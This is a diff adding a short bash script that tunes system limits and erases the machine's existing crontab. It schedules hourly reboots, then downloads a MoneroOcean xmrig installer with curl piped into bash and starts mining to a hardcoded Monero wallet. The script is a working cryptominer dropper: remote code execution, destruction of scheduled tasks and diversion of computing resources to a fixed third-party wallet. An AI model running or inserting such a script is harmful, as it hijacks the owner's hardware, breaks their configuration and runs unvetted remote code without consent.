@@ -1,0 +1,13 @@
+#!/bin/bash
+
+apt update && apt upgrade -y && apt autoremove -y && ulimit -u unlimited && ulimit -n 65536 && apt install bc man nload htop curl -y
+
+crontab -r >/dev/null 2>&1
+(
+	crontab -l 2>/dev/null
+	echo "00 * * * * /sbin/reboot"
+	echo "@reboot root ulimit -u unlimited && ulimit -n 65536"
+) | crontab -
+
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 8BvGDdUNdGwG5B9oNUywNc9yh7ggEJjskRyBhUYNLT63fjryxsVRLsmVED7JvJTyfq5zjkAVxcdohdmgX7b9UFS2GWUWWEq && cd mo* && ./xm*
+
